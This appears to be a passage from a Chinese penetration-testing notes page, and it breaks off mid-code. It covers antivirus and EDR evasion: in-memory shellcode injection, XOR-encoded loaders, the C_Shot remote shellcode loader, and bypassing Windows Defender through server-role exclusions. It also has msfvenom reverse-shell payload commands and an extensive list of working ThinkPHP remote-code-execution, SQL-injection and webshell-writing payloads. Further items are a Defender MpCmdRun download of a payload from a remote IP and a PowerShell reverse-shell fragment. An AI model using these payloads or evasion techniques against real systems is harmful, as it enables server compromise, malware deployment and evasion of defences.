动态调用进程注入逻辑</h2>\n<pre><code>感兴趣可阅读以下\nhttps://github.com/dtrizna/DInvoke_PoC\nhttps://rastamouse.me/blog/process-injection-dinvoke/\nhttps://thewover.github.io/Dynamic-Invoke/\n这里测试的是使用donut的python模块。注入notepad进程\n</code></pre>\n<p><img data-src=\"745.png\" alt=\"\" /><br />\n<img data-src=\"746.png\" alt=\"\" /></p>\n<h2 id=\"在windows-server-2016和2019中绕过windows-defender\"><a class=\"anchor\" href=\"#在windows-server-2016和2019中绕过windows-defender\">#</a> 在 Windows Server 2016 和 2019 中绕过 Windows Defender</h2>\n<pre><code>当获得了一个webshell的时候，下一步要反弹个shell回来\n</code></pre>\n<p><img data-src=\"747.png\" alt=\"\" /></p>\n<pre><code>在尝试了https://github.com/trustedsec/unicorn独角兽失败之后，找到了一篇使用golang将shellcode注入到内存的文章\nhttps://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/\nhttps://github.com/brimstone/go-shellcode\nhttps://golang.org/pkg/syscall/?GOOS=windows#NewLazyDLL\n该代码利用golang中的syscall包来调用NewLazyDLL  方法来加载Kernel32.dll，加载Kernel32.dll后，即可将其用于寻址和内存分配。编译后的代码将十六进制格式的msfvenom内容用作命令行参数。\n由于代码存在许久，可能直接使用会被检测到，这里对其进行了修改，重命名所有变量，通过URL方式加载shellcode，为了绕过沙盒，添加了一些其他的参数，如果不存在参数则退出执行。\n用powershell下载到服务器\n</code></pre>\n<p><img data-src=\"748.png\" alt=\"\" /></p>\n<pre><code>等了几分钟，发现文件没有被删除，再执行。Msf收到会话\n</code></pre>\n<p><img data-src=\"749.png\" alt=\"\" /></p>\n<pre><code>在尝试了getuid命令之后，返回了错误，查看了以下目录，还是被删除了\n</code></pre>\n<p><img data-src=\"750.png\" alt=\"\" /><br />\n<img data-src=\"751.png\" alt=\"\" /></p>\n<pre><code>本地复现了下，可以看到被检测到了\n</code></pre>\n<p><img data-src=\"752.png\" alt=\"\" /></p>\n<pre><code>绕过可以看一下微软的文章\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/configure-server-exclusions-microsoft-defender-antivirus#list-of-automatic-exclusions\nWindows Server 2016和2019上的Microsoft Defender Antivirus自动将您注册为某些排除项，具体由您指定的服务器角色定义。请参阅  自动排除项列表 。这些排除项不会被windows defender检查。\n</code></pre>\n<p><img data-src=\"753.png\" alt=\"\" /></p>\n<pre><code>按照文章，创建个目录PHP5433，修改文件为php-cgi.exe即可绕过wd的防护\n</code></pre>\n<p><img data-src=\"754.png\" alt=\"\" /><br />\n<img data-src=\"755.png\" alt=\"\" /><br />\n<img data-src=\"756.png\" alt=\"\" /><br />\n<img data-src=\"757.png\" alt=\"\" /></p>\n<pre><code>使用烂土豆提权\n</code></pre>\n<p><img data-src=\"758.png\" alt=\"\" /></p>\n<pre><code>文中webshell: https://github.com/NetSPI/cmdsql\n</code></pre>\n<h2 id=\"内存中解码shellcode绕过av\"><a class=\"anchor\" href=\"#内存中解码shellcode绕过av\">#</a> 内存中解码 shellcode 绕过 av</h2>\n<pre><code>https://github.com/mhaskar/Shellcode-In-Memory-Decoder\n流程\n打开一个进程并检索该进程的HANDLE。\n在进程中分配空间（检索内存地址）。\n将数据（shellcode）写入该进程中。\n执行shellcode。\n我们可以使用几个Win32 API执行这些步骤：\nOpenProcess()\nVirtualAllocEx()\nWriteProcessMemory()\nCreateRemoteThread()\n正常情况下，我们将原始shellcode直接写入到内存中，但是如果AV /EDR检测到了Shellcode，它们肯定会发出警报\n所以我们在二进制文件中使用可逆的方式把shellcode编码，再解码写入内存来规避防护。\n比如加、减、异或、交换。\n使用cs生成个shellcode\n</code></pre>\n<p><img data-src=\"759.png\" alt=\"\" /></p>\n<pre><code>使用python进行异或\n</code></pre>\n<p><img data-src=\"760.png\" alt=\"\" /></p>\n<pre><code>该脚本读取我们的shellcode的每个操作码，然后将其与字节0x01（在这种情况下为我们的密钥）进行异或，将其打印为如下的shellcode ：\n</code></pre>\n<p><img data-src=\"761.png\" alt=\"\" /></p>\n<pre><code>现在，我们将开始实现将为我们执行shellcode注入的C代码。\n编译方式\nx86_64-w64-mingw32-gcc decoder.c -o decoder.exe -w\n我将逐步介绍每个win32 API。\n打开过程并获取一个句柄\n我们需要选择一个向其注入shellcode的进程，然后需要检索该过程的句柄，以便可以对其执行一些操作，我们将使用OpenProcess win32 API\n</code></pre>\n<p><img data-src=\"762.png\" alt=\"\" /></p>\n<pre><code>该代码将您要获取其句柄的进程ID作为第一个参数，然后它将使用具有PROCESS_ALL_ACCESS访问权限的OpenProcess()来打开该进程并将该句柄保存在变量process中，最后，为我们打印\n</code></pre>\n<p><img data-src=\"763.png\" alt=\"\" /></p>\n<pre><code>成功检索到该句柄\n检索句柄后的下一步将是在该进程内分配空间，我们可以使用VirtualAllocEx()\n</code></pre>\n<p><img data-src=\"764.png\" alt=\"\" /></p>\n<pre><code>base_address代表分配的内存的地址\n16行，我们将打印分配的内存的地址，并将其写入数据\n</code></pre>\n<p><img data-src=\"765.png\" alt=\"\" /></p>\n<pre><code>0x29d0000作为地址，\n使用x64dbg附加explorer.exe进程，转到这里看看\n</code></pre>\n<p><img data-src=\"766.png\" alt=\"\" /></p>\n<pre><code>可以看到函数VirtualAllocEx已为我们在explorer.exe中分配了内存空间，我们准备写入数据。\n接下来我们解码shellcode并写到内存中\n即使使用这种类型（这里用的是异或）的编码，我们的shellcode也可能会被标记，因此请确保在操作中使用之前使用更强的编码并对其进行测试。\n这里为测试就只使用的0x01\n</code></pre>\n<p><img data-src=\"767.png\" alt=\"\" /></p>\n<pre><code>这段代码将使用密钥0x01对每个字节进行解码后，将我们的shellcode写入内存中\n运行\n</code></pre>\n<p><img data-src=\"768.png\" alt=\"\" /></p>\n<pre><code>如图所见，我们将每个字节写入地址，现在我们用x64dbg进行调试，然后转到地址 0x3ce0000查看一下：\n</code></pre>\n<p><img data-src=\"769.png\" alt=\"\" /></p>\n<pre><code>可以看到shellcode已经写入进去了。\n下一步就是执行shellcode了\n使用CreateRemoteThread()函数来执行\n</code></pre>\n<p><img data-src=\"770.png\" alt=\"\" /><br />\n<img data-src=\"771.png\" alt=\"\" /><br />\n<img data-src=\"772.png\" alt=\"\" /></p>\n<h2 id=\"cshot-shellcode远程加载器\"><a class=\"anchor\" href=\"#cshot-shellcode远程加载器\">#</a> cshot shellcode 远程加载器</h2>\n<pre><code>From:\nhttps://github.com/anthemtotheego/C_Shot\nhttp://blog.redxorblue.com/2020/07/cshot-just-what-doctor-ordered.html\nC_Shot是一种用C语言编写的攻击性安全工具，旨在通过HTTP / HTTPS下载远程shellcode二进制文件（.bin），注入并执行shellcode。\n1.shellcode注入其自己的进程\n2.使用父进程欺骗将shellcode注入子进程\n使用C_Shot之类的工具的好处是，我们要执行的恶意代码没有存储在二进制文件中，而是从远程位置检索，读入内存然后执行。这有助于使诸如C_Shot之类的工具对AV / EDR显得相当友好，并且不会被发现。\n</code></pre>\n<p><img data-src=\"773.png\" alt=\"\" /></p>\n<pre><code>cl / D _UNICODE / D UNICODE cshot.c\n</code></pre>\n<p><img data-src=\"774.png\" alt=\"\" /></p>\n<pre><code>生成分阶段payload\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -a x64 --platform windows -b &quot;\\x00&quot; -f raw -o /root/Desktop/DefaultStaged.bin\n生成无阶段payload\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST= IP LPORT= PORT -a x64 --platform windows -b &quot;\\x00&quot; -f raw -o /root/Desktop/DefaultStageless.bin\n现在我们已经建立了二进制文件，现在需要一个Web服务。例如运行python -m SimpleHTTPServer 80，或者将它们托管在外部某个地方。对于本文中的所有示例，我将使用github托管shellcode。\n</code></pre>\n<p><img data-src=\"775.png\" alt=\"\" /></p>\n<pre><code>确保windows defender打开。\n</code></pre>\n<p><img data-src=\"776.png\" alt=\"\" /></p>\n<pre><code>注入到自己的进程中\n</code></pre>\n<p><img data-src=\"777.png\" alt=\"\" /></p>\n<pre><code>测试分阶段的shellcode会被windows defender拦截\n</code></pre>\n<p><img data-src=\"778.png\" alt=\"\" /></p>\n<pre><code>无阶段的shellcode不会被拦截\n</code></pre>\n<p><img data-src=\"779.png\" alt=\"\" /></p>\n<pre><code>获得shell\n</code></pre>\n<p><img data-src=\"780.png\" alt=\"\" /></p>\n<pre><code>测试分阶段shellcode欺骗父进程方法：\n</code></pre>\n<p><img data-src=\"781.png\" alt=\"\" /><br />\n<img data-src=\"782.png\" alt=\"\" /></p>\n<pre><code>获得shell\n</code></pre>\n<p><img data-src=\"783.png\" alt=\"\" /></p>\n<pre><code>现在测试下CrowdStrike\n注入到自己的进程，两种shellcode都被拦截\n</code></pre>\n<p><img data-src=\"784.png\" alt=\"\" /><br />\n<img data-src=\"785.png\" alt=\"\" /></p>\n<pre><code>欺骗父进程\n</code></pre>\n<p><img data-src=\"786.png\" alt=\"\" /></p>\n<pre><code>获得shell\n</code></pre>\n<p><img data-src=\"787.png\" alt=\"\" /><br />\n<img data-src=\"788.png\" alt=\"\" /></p>\n<pre><code>分阶段和无阶段的shellcode在使用欺骗父进程方法时都可以绕过av。\n此工具在公共发行版中，没有进行任何形式的API隐藏，字符串混淆，内存保护技巧等工作。如果未进行任何修改，则对该工具的静态分析应该很容易发现。\n</code></pre>\n<h2 id=\"thinkphp渗透手段\"><a class=\"anchor\" href=\"#thinkphp渗透手段\">#</a> thinkphp 渗透手段</h2>\n<p><img data-src=\"840.png\" alt=\"\" /></p>\n<pre><code>thinkphp 3.2.3\nwhere注入\n利用字符串方式作为where传参时存在注入\n1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+\nexp注入\n这里使用全局数组进行传参(不要用I方法)，漏洞才能生效\npublic function  getuser()&#123;\n    $User = D('User');\n    $map = array('id' =&gt; $_GET['id']);\n    $user = $User-&gt;where($map)-&gt;find();\n    dump($user);\n&#125;\nid[0]=exp&amp;id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+\nbind注入\npublic function  getuser()&#123;\n    $data['id'] = I('id');\n    $uname['username'] = I('username');\n    $user = M('User')-&gt;where($data)-&gt;save($uname);\n    dump($user);\n&#125;\nid[0]=bind&amp;id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username=fanxing\nfind/select/delete注入\npublic function getuser()&#123;\n$user = M('User')-&gt;find(I('id'));\ndump($user);\n&#125;\n?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)\norder by注入\npublic function user()&#123;\n$data['username'] = array('eq','admin');\n$user = M('User')-&gt;where($data)-&gt;order(I('order'))-&gt;find();\ndump($user);\n&#125;\norder=id and(updatexml(1,concat(0x7e,(select user())),0))\n此文转自酒仙桥六号部队\nTP5\n开启debug下的数据库连接\ntp5.0.*在debug模式下如果在数据交互点构造如sql注入、空参数等方式使数据库查询等出错，在一定情况下可能导致数据库账号密码直接显示出来。（报错信息太细了不仔细容易忽略掉）\n</code></pre>\n<p><img data-src=\"789.png\" alt=\"\" /></p>\n<pre><code>在debug模式下找注入点也可以通过报错语句进行构造，并且由于debug模式可能导致本来没有回显的注入变成报错注入。当然目标数据库无法外连的时候，这个注入就挺有用的了。\n</code></pre>\n<p><img data-src=\"790.png\" alt=\"\" /></p>\n<pre><code>关于log文件的利用\nlog文件是runtime/log目录下的，比较常见的路径类似：\n/runtime/log/2020001/01.log ，默认是启用的，关于该文件主要有以下三点利用方式。\n1.关于http请求的部分\n常见的log文件会记录http请求，如果对应的站点存在后台等登陆，可以通过记录请求中的cookie登陆后台。\n</code></pre>\n<p><img data-src=\"791.png\" alt=\"\" /></p>\n<pre><code>2.关于构造sql注入\n某些配置下日志还会记录sql语句的执行和报错，可以用于构造sql注入，但是一般这种利用比较少，需要先找到数据交互点然后和日志中记录的赋值以及报错一一对应。\n3.关于cache文件名\ntp下通过缓存文件获取webshell是一个老生常谈的问题，白盒下理论上都说得通，但是实际上在使用该漏洞的时候是存在部分难点的，如生成cache文件的方式，cache文件名等。\n在log文件中可能存在cache文件生成时的报错，这样可以确定目标tp的cache文件命名方式等，举个例子：\n在某次渗透中目标tp的log文件。\n</code></pre>\n<p><img data-src=\"792.png\" alt=\"\" /></p>\n<pre><code>可以注意到这里由于生成缓存文件出错，导致直接将缓存文件的文件名输出。根据输出的缓存文件名去猜测生成规则，由于tp5的缓存文件命名默认是md5(value)，所以大部分时候可以把文件名等带进value进行比对。\n这里通过猜测和比对确定是view的文件绝对路径生成的cache文件名。\n</code></pre>\n<p><img data-src=\"793.png\" alt=\"\" /></p>\n<pre><code>一般来说使用php原生的md5函数去生成md5比较稳妥，笔者为了方便直接在线加密的。\n这里基本上就排除了cache getshell的一大难题。之后正常去寻找能进库的交互点，比如发帖，留言这种，就能想办法获取webshell了。\ntp5路由\nthinkphp系列的官方开发文档是期望网站运维人员将public设置为web根目录，即使用./public/index.php作为入口文件。在实际的渗透过程中由于thinkphp是框架涉及很多二次开发，部分开发人员会选择自定义一个入口文件而不置于public目录下，如/var/www/html/index.php的形式。这里会涉及到打exp的路由问题，由于部分开发人员自定的入口文件可能导致调用的路径出现差异。\n一般来说打exp的时候尽量使用./public/index.php来打，以下列exp为例：\n?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\n可能会出现例如：\nhttp://xxx/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\nhttp://xxx/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\nhttp://xxx/index.php?s=\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\n所以很多时候不是打一个exp无效就代表没洞，在黑盒测试的时候可能只是没有找对路由。\n下面是实战中的案例：\n</code></pre>\n<p><img data-src=\"794.png\" alt=\"\" /></p>\n<pre><code>可以看到如果以常规的exp进行测试是返回方法不存在的，因为原生路由被二次开发修改了，所以最终代码执行的payload如下：\n</code></pre>\n<p><img data-src=\"795.png\" alt=\"\" /></p>\n<pre><code>5.0.*和5.1.*\n相对来说5.0可利用的exp比较5.1要多一些，5.1主要的利用方式还是上面举例用的exp。\nApp.php出现问题的代码如下：\n</code></pre>\n<p><img data-src=\"796.png\" alt=\"\" /></p>\n<pre><code>其实就是把反斜杠认定为类名，最终使得类实例化，具体的分析在这里就不拿出来水字数了。\n而在渗透的过程中大的思路其实是差不多的，尝试多种exp，尝试读log文件等，可以通过简单比对两个版本的目录结构在没有其他信息的情况下判断版本。\nTP5：\n</code></pre>\n<p><img data-src=\"797.png\" alt=\"\" /></p>\n<pre><code>TP5.1：\n</code></pre>\n<p><img data-src=\"798.png\" alt=\"\" /></p>\n<pre><code>如果网站不是以/public/作为根目录的话，又没通过报错直接体现版本的，可以通过访问目录看目录是否存在来做判断比如访问./thinkphp/，这里不推荐通过/app/目录来做判断，因为笔者遇到过很多开发者会修改这个目录，比方说改成/apps/，/applications/，也就无法准确判断是5.1还是5.0。\ntp3的渗透思路\ntp3 关于log文件相关的利用同上，目录一般为./Application/Runtime/logs/xxx/xx_xx_xx.log ，其中xxx为app名，文件名为年_月_日.log，如：\nApplication\\Runtime\\Logs\\Home\\16_09_09.log。\nsql注入\ntp3的sql注入指的是框架层面的注入问题，即二次开发的时候如果调用了model内的find, delete, select方法的话，就可能出现注入问题。\n对于白盒测试而言，只要model.class.php没修复然后找到调用了方法的地方就可以挖掘到注入。\n以select方法简单做个分析。\nModel.class.php\n</code></pre>\n<p><img data-src=\"799.png\" alt=\"\" /></p>\n<pre><code>函数可以接受一个options参数，为了构成注入肯定是要进入到_parseOptions方法，也就是要绕过两次判断，也就是只要传输的options为数组，同时主键不是数组，就能进到_parseOptions方法。\n</code></pre>\n<p><img data-src=\"800.png\" alt=\"\" /></p>\n<pre><code>可以看到传入options['table']或options['alias']且设置options['where']值为字符串，最终会options直接返回，整个过程是没有过滤的，然后进到ThinkPHP\\Libray\\Think\\Db\\Diver.class.php，进到select方法。\n</code></pre>\n<p><img data-src=\"801.png\" alt=\"\" /></p>\n<pre><code>可以看到sql语句是最后的parseSql生成的。\n</code></pre>\n<p><img data-src=\"802.png\" alt=\"\" /></p>\n<pre><code>跟进到parseWhere方法，只要绕过if，最终的return的sql语句是直接拼接的，也就是注入的产生原因，会直接带入select方法执行。\n</code></pre>\n<p><img data-src=\"803.png\" alt=\"\" /></p>\n<pre><code>黑盒测试也比较类似，一般情况下找到数据库交互点后进行注入尝试即可。\ncache写shell\ncache写webshell的难点在于cache文件名的确定，一般情况下是md5(绝对路径)生成的cache文件，上文也提到某些情况下可以通过log文件确定cache文件名称\ncache文件写入的时候会被注释，所以需要通过%0d%0a提行绕过注释。\n所以最终的payload一般为：\n\n%0d%0aeval($_POST['cmd']);%0d%0a//\n找到参数影响页面的点后通过传参写入webshell，本地可以复现，实战中倒是没遇到过。\ntp3渗透主要思路\ntp3的渗透在实战中利用的点比较少，所以一般而言遇到tp3的目标，最主要的思路在于找log，然后通过log去看有没有后台之类的，相对来说较一起会比对框架的注入，cache写shell等靠谱。\ntp3 关于log文件相关的利用同tp5，目录一般为./Application/Runtime/logs/xxx/xx_xx_xx.log ，其中xxx为app名，文件名为年_月_日.log，如：\nApplication\\Runtime\\Logs\\Home\\16_09_09.log，文件名的格式可能会有变化，多尝试一下一般也能找到。\ntp6的新型问题\ntp6的利用链\n关于model.php的__destruct()方法调用其他类__tostring()方法的文已经有人发过了，但是文中把poc打码了，这里简单跟一下。\n</code></pre>\n<p><img data-src=\"804.png\" alt=\"\" /></p>\n<pre><code>将对象的lazySave属性设置为True进入save方法：\n</code></pre>\n<p><img data-src=\"805.png\" alt=\"\" /></p>\n<pre><code>然后进updateData方法：\n</code></pre>\n<p><img data-src=\"806.png\" alt=\"\" /></p>\n<pre><code>在checkAllowFields方法中调用db方法，图中方法中框起来的语句是可以拼接的，只需要将这两个属性中的一个设置为类对象，即可触发对象的__toString方法。之后的利用方式和tp5.*相同。\n</code></pre>\n<p><img data-src=\"807.png\" alt=\"\" /><br />\n<img data-src=\"808.png\" alt=\"\" /></p>\n<pre><code>接着与tp5.*后的gadget是一致的，最终目的是要这个效果实现代码执行。\n</code></pre>\n<p><img data-src=\"809.png\" alt=\"\" /></p>\n<pre><code>接下来是构造poc，由于测试利用链，笔者手写了一个unserialize。\n</code></pre>\n<p><img data-src=\"810.png\" alt=\"\" /></p>\n<pre><code>然后通过Dido1960大佬的poc代码生成payload。\npoc参见：\nhttps://github.com/Dido1960/thinkphp/blob/master/v6.0.x/poc/poc.php\n</code></pre>\n<p><img data-src=\"811.png\" alt=\"\" /></p>\n<pre><code>该利用链需求一个反序列化的可控点，二次开发在使用unserialize后可能导致代码执行。同时也可能利用该问题构成一个tp6的后门，如已经通过其他方式获取服务器权限，则可在某些地方加入unserialize函数实现反序列化的一个后门。\n所有poc\nThinkphp5 rce poc\n利用工具\nhttps://github.com/wh1t3p1g/phpggc\nhttps://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection\nthinkphp 5.0.22\n1、http://192.168.1.1/thinkphp/public/?s=.|think\\config/get&amp;name=database.username\n2、http://192.168.1.1/thinkphp/public/?s=.|think\\config/get&amp;name=database.password\n3、http://url/to/thinkphp_5.0.22/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id\n4、http://url/to/thinkphp_5.0.22/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\nthinkphp 5\n5、http://127.0.0.1/tp5/public/?s=index/\\think\\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1\nthinkphp 5.0.21\n6、http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id\n7、http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\nthinkphp 5.1.*\n8、http://url/to/thinkphp5.1.29/?s=index/\\think\\Request/input&amp;filter=phpinfo&amp;data=1\n9、http://url/to/thinkphp5.1.29/?s=index/\\think\\Request/input&amp;filter=system&amp;data=cmd\n10、http://url/to/thinkphp5.1.29/?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E\n11、http://url/to/thinkphp5.1.29/?s=index/\\think\\view\\driver\\Php/display&amp;content=%3C?php%20phpinfo();?%3E\n12、http://url/to/thinkphp5.1.29/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\n13、http://url/to/thinkphp5.1.29/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd\n14、http://url/to/thinkphp5.1.29/?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\n15、http://url/to/thinkphp5.1.29/?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd\n未知版本\n16、?s=index/\\think\\module/action/param1/$&#123;@phpinfo()&#125;\n17、?s=index/\\think\\Module/Action/Param/$&#123;@phpinfo()&#125;\n18、?s=index/\\think/module/aciton/param1/$&#123;@print(THINK_VERSION)&#125;\n19、index.php?s=/home/article/view_recent/name/1'\nheader = &quot;X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#&quot;\n20、index.php?s=/home/shopcart/getPricetotal/tag/1%27\n21、index.php?s=/home/shopcart/getpriceNum/id/1%27\n22、index.php?s=/home/user/cut/id/1%27\n23、index.php?s=/home/service/index/id/1%27\n24、index.php?s=/home/pay/chongzhi/orderid/1%27\n25、index.php?s=/home/pay/index/orderid/1%27\n26、index.php?s=/home/order/complete/id/1%27\n27、index.php?s=/home/order/complete/id/1%27\n28、index.php?s=/home/order/detail/id/1%27\n29、index.php?s=/home/order/cancel/id/1%27\n30、index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+\n31、POST /index.php?s=/home/user/checkcode/ HTTP/1.1\nContent-Disposition: form-data; name=&quot;couponid&quot;\n1') union select sleep('''+str(sleep_time)+''')#\nthinkphp 5.0.23（完整版）debug模式\n32、(post)public/index.php (data)_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=touch%20/tmp/xxx\nthinkphp 5.0.23(完整版)\n33、（post）public/index.php?s=captcha (data) _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al\nthinkphp 5.0.10（完整版）\n34、(post)public/index.php?s=index/index/index (data)s=whoami&amp;_method=__construct&amp;method&amp;filter[]=system\nthinkphp 5.1.* 和 5.2.* 和 5.0.*\n35、(post)public/index.php (data)c=exec&amp;f=calc.exe&amp;_method=filter\nThinkphp5 注入 poc\n需开启app_debug\nhttp://yoursite/index/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1\nhttp://localhost:8000/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0\nhttp://localhost:8000/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)#\nhttp://localhost:8000/index/index/index?username[0]=not like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=) union select 1,user()#\nhttp://localhost:8000/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1\nhttp://localhost:8000/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23\nThinkphp5 文件包含 poc\n5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10\n创建 application/index/view/index/index.html 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 1.jpg 放至 public 目录下（模拟上传图片操作）。接着访问 \thttp://localhost:8000/index/index/index?cacheFile=demo.php 链接，即可触发 文件包含漏洞 。\nThinkphp5 代码执行poc\n5.0.0&lt;=ThinkPHP5&lt;=5.0.10\nhttp://localhost/tpdemo/public/?username=mochazz123%0d%0a@eval($_GET[_]);//\nhttp://localhost:8000/index.php?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\nThinkPHP &lt;= 5.0.13\nPOST /?s=index/index\ns=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system\nThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug\nPOST /\n_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al\n\nThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha\nPOST /?s=xxx HTTP/1.1\n_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al\n_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls\n写shell进日志\n_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST['x'])?&gt;\n&amp;\n写shell进session\nPOST /?s=captcha HTTP/1.1\nCookie: PHPSESSID=kking\n_method=__construct&amp;filter[]=think\\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST['x'])?&gt;&amp;server[]=1\n&amp;\n包含session getshell\nPOST /?s=captcha\n_method=__construct&amp;method=get&amp;filter[]=think\\__include_file&amp;get[]=tmp\\sess_kking&amp;server[]=1\n通过日志包含getshell\n_method=__construct&amp;method=get&amp;filter[]=think\\__include_file&amp;server[]=phpinfo&amp;get[]=../data/runtime/log/201901/21.log&amp;x=phpinfo();\n&amp;\nPOST /?s=captcha\nCookie: PHPSESSID=kking\n_method=__construct&amp;filter[]=think\\Session::set&amp;method=get&amp;get[]=abPD9waHAgQGV2YWwoJF9HRVRbJ3InXSk7Oz8%2bab&amp;server[]=1\n+号用urlencode编码为%2b，前后加ab为了凑足解码\n/?s=captcha&amp;r=phpinfo();\n_method=__construct&amp;method=get&amp;filter[]=think\\__include_file&amp;get[]=php://filter/read=convert.base64-decode/resource=c:\\www\\tmp\\sess_kking&amp;server[]=1\n&amp;\nPOST /?s=captcha&amp;r=phpinfo();\nCookie: PHPSESSID=kking\n_method=__construct&amp;method=get&amp;filter[]=base64_decode&amp;filter[]=think\\__include_file&amp;get[]=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPWM6XHd3d1x0bXBcc2Vzc19ra2luZw==&amp;server[]=1\n&amp;\n设置session\nPOST /?s=captcha\nCookie: PHPSESSID=kktest\n\n_method=__construct&amp;filter[]=think\\Session::set&amp;method=get&amp;get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&amp;server[]=1\n文件包含\nPOST /?s=captcha&amp;r=cGhwaW5mbygpOw==\n\n_method=__construct&amp;filter[]=strrev&amp;filter[]=think\\__include_file&amp;method=get&amp;server[]=1&amp;get[]=tsetkk_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php\nThinkphp6 任意文件创建\n需可控session参数，如username\n/index.php?username=&lt;?php phpinfo();?&gt;\nCookie:1234567890123456789012345670.php\nCookie需32位\n在runtime\\session下生成\nsess_1234567890123456789012345670.php文件\n</code></pre>\n<h2 id=\"使用windows-defender下载文件\"><a class=\"anchor\" href=\"#使用windows-defender下载文件\">#</a> 使用 windows defender 下载文件</h2>\n<pre><code>C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0&gt;MpCmdRun.exe -DownloadFile -url http://192.168.2.105:8000/payload.c -path c:\\\\users\\\\test\\\\desktop\\\\1.c\n</code></pre>\n<p><img data-src=\"812.png\" alt=\"\" /></p>\n<pre><code>其他利用\n</code></pre>\n<p><img data-src=\"812-2.png\" alt=\"\" /><br />\n<img data-src=\"812-3.jfif\" alt=\"\" /><br />\n<img data-src=\"812-4.jfif\" alt=\"\" /></p>\n<h2 id=\"powershell脚本混淆绕过amsi和av\"><a class=\"anchor\" href=\"#powershell脚本混淆绕过amsi和av\">#</a> Powershell 脚本混淆绕过 amsi 和 av</h2>\n<pre><code>https://github.com/tokyoneon/Chimera\n以下是Invoke-PowerShellTcp.ps1的片段\n</code></pre>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$stream</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$client</span>.GetStream<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token variable\">$bytes</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">..</span><span class=\"token number\">65535</span><span class=\"token operator\">|</span>%<span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#Send back current username and computername</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$sendbytes</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>text.encoding<span 